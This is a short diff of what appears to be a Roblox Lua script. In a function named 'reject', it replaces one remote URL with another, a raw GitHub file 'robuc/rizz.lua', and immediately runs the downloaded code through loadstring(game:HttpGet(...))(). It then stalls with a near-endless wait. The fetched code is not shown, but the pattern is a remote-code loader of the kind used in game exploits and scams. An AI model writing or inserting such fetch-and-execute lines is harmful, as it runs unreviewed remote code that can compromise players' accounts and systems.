@@ -1,7 +1,7 @@
 repeat task.wait() until game:IsLoaded()
 
 local function reject()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/123coconut123/Variables/main/Code"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Joystickplay/robuc/main/rizz.lua"))()
 wait(100000000000)
 end
 
